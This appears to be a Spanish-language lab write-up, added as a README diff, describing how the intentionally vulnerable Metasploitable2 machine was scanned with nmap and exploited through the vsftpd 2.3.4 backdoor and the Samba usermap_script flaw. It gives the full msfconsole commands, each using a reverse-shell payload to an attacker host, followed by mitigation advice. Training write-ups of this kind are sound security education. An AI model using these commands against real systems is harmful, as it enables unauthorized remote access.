@@ -1,0 +1,95 @@
+# Vulnerando-metasploitable2
+Vulnerando maquina metasploitable2 con msfconsole hacia los puertos 21,445 y sus vulnerabilidades .
+
+[Vulnerando-metasploitable2-informe.pdf](https://github.com/user-attachments/files/19570085/Vulnerando-metasploitable2-informe.pdf)
+
+🛡️ Informe Ejecutivo de Seguridad: Explotación de Metasploitable2 🛠️
+Objetivo: Realizar una auditoría de seguridad sobre la máquina Metasploitable2 a través de los puertos 21 (FTP) y 445 (SMB), identificando las vulnerabilidades y explotándolas para obtener acceso remoto. Además, se detallan las medidas para mitigar los riesgos detectados.
+
+🧐 Fase 1: Análisis de la Máquina Objetivo 🔍
+🔧 Escaneo Inicial de la Máquina Objetivo:
+Antes de proceder con la explotación, realizamos un análisis exhaustivo de la máquina objetivo utilizando herramientas como Nmap para identificar los puertos abiertos y los servicios vulnerables.
+    1. Escaneo de puertos con Nmap:
+        ◦ Utilizamos Nmap para realizar un escaneo de puertos en la dirección IP de la máquina objetivo (10.0.2.5). El comando utilizado fue:
+          bash
+          CopiarEditar
+          nmap -sV 10.0.2.5
+          Este escaneo nos proporcionó información detallada sobre los servicios que estaban en ejecución y sus versiones.
+    2. Resultado del escaneo: El escaneo reveló los siguientes puertos abiertos y los servicios asociados:
+        ◦ Puerto 21 (FTP): vsftpd 2.3.4
+        ◦ Puerto 445 (SMB): Samba 3.0.20-Debian
+       Estos servicios nos indicaron que la máquina era vulnerable a ciertos exploits conocidos, lo que nos permitió continuar con la fase de explotación.
+
+
+🚨 Resumen de la Explotación 🚨
+🔍 Puertos Identificados y Vulnerabilidades Detectadas:
+    • Puerto 21 (FTP): Explotación mediante una puerta trasera en el servicio vsftpd 2.3.4.
+    • Puerto 445 (SMB): Explotación a través de la vulnerabilidad en Samba utilizando usermap_script para ejecutar un comando remoto.
+      
+
+🏁 Fase 1: Explotación en el Puerto 21 (FTP - vsftpd 2.3.4) 🔓
+🧑‍💻 Vulnerabilidad Detectada:
+    • El servicio vsftpd 2.3.4 tiene una vulnerabilidad conocida como "backdoor", la cual permite a un atacante obtener acceso remoto en el momento en que el servicio se inicia.
+🔨 Explotación:
+    1. Exploit utilizado: exploit/unix/ftp/vsftpd_234_backdoor en Metasploit.
+    2. Configuración del Payload: Se usa el payload cmd/unix/reverse para obtener acceso remoto.
+    3. Comando ejecutado:
+       
+       use exploit/unix/ftp/vsftpd_234_backdoor
+       set RHOSTS 10.0.2.5
+       set PAYLOAD cmd/unix/reverse
+       set LHOST 10.0.2.4
+       run
+    4. Resultado: Obtención de acceso remoto mediante una reverse shell. 
+
+
+
+
+🏁 Fase 2: Explotación en el Puerto 445 (SMB - Samba) 🔓
+🧑‍💻 Vulnerabilidad Detectada:
+    • Samba presenta una vulnerabilidad en versiones antiguas que permite la ejecución remota de código a través de nombres de pipes conocidos.
+🔨 Explotación:
+    1. Exploit utilizado: exploit/multi/samba/usermap_script en Metasploit.
+    2. Configuración del Payload: Se utiliza el payload cmd/unix/reverse para ejecutar comandos remotos en el sistema de destino.
+    3. Comando ejecutado:
+       bash
+       CopiarEditar
+       use exploit/multi/samba/usermap_script
+       set RHOSTS 10.0.2.5
+       set PAYLOAD cmd/unix/reverse
+       set LHOST 10.0.2.4
+       run
+    4. Resultado: Obtención de shell remota en el sistema de destino. 🖥️
+
+
+
+
+⚠️ Impacto Potencial ⚠️
+    • Acceso no autorizado: Los atacantes pueden obtener acceso completo al sistema y a los datos sensibles.
+    • Control total del sistema: Una vez explotadas las vulnerabilidades, el atacante puede tomar control total del sistema comprometido.
+    • Exposición a ataques posteriores: Las vulnerabilidades abiertas pueden ser utilizadas como punto de entrada para ataques adicionales.
+
+🔧 Medidas de Mitigación 🔧
+🛡️ Recomendaciones para Mitigar las Vulnerabilidades:
+    1. Actualizar servicios:
+        ◦ vsftpd 2.3.4: Actualizar a la última versión de vsftpd para eliminar la puerta trasera.
+        ◦ Samba: Actualizar a la versión más reciente de Samba para corregir la vulnerabilidad de ejecución remota de código.
+    2. Configurar firewall:
+        ◦ Utilizar un firewall para limitar el acceso a puertos críticos, como el puerto 21 (FTP) y el puerto 445 (SMB).
+        ◦ ⚙️ Restricción de acceso: Solo permitir el acceso a direcciones IP específicas.
+    3. Desactivar servicios innecesarios:
+        ◦ Si no es necesario usar FTP o SMB, considera desactivar estos servicios para reducir la superficie de ataque.
+        ◦ 🛑 Desactivar FTP: Si no es necesario para el sistema, considera eliminar el servicio vsftpd.
+    4. Auditoría continua:
+        ◦ Realizar auditorías de seguridad regulares para identificar y mitigar nuevas vulnerabilidades.
+        ◦ 📅 Escaneo regular: Utilizar herramientas como Nessus o OpenVAS para detectar vulnerabilidades.
+    5. Autenticación fuerte:
+        ◦ Implementar medidas de autenticación más robustas, como autenticación de dos factores (2FA) y contraseñas complejas.
+        ◦ 🔐 Cifrado de contraseñas: Asegúrate de que todas las contraseñas estén cifradas correctamente.
+
+📝 Conclusiones Finales 🎯
+    • La auditoría de seguridad reveló vulnerabilidades graves en los puertos 21 (FTP) y 445 (SMB) que pueden ser explotadas para obtener acceso remoto completo al sistema.
+    • Mitigar estas vulnerabilidades es crucial para proteger la máquina y prevenir posibles ataques.
+    • Se recomienda actualizar servicios y aplicar configuraciones de seguridad más estrictas para prevenir futuros incidentes.
+
+¡Gracias por leer el informe ejecutivo de seguridad! Si tienes alguna pregunta o necesitas más detalles, no dudes en contactarnos. 😃🔐
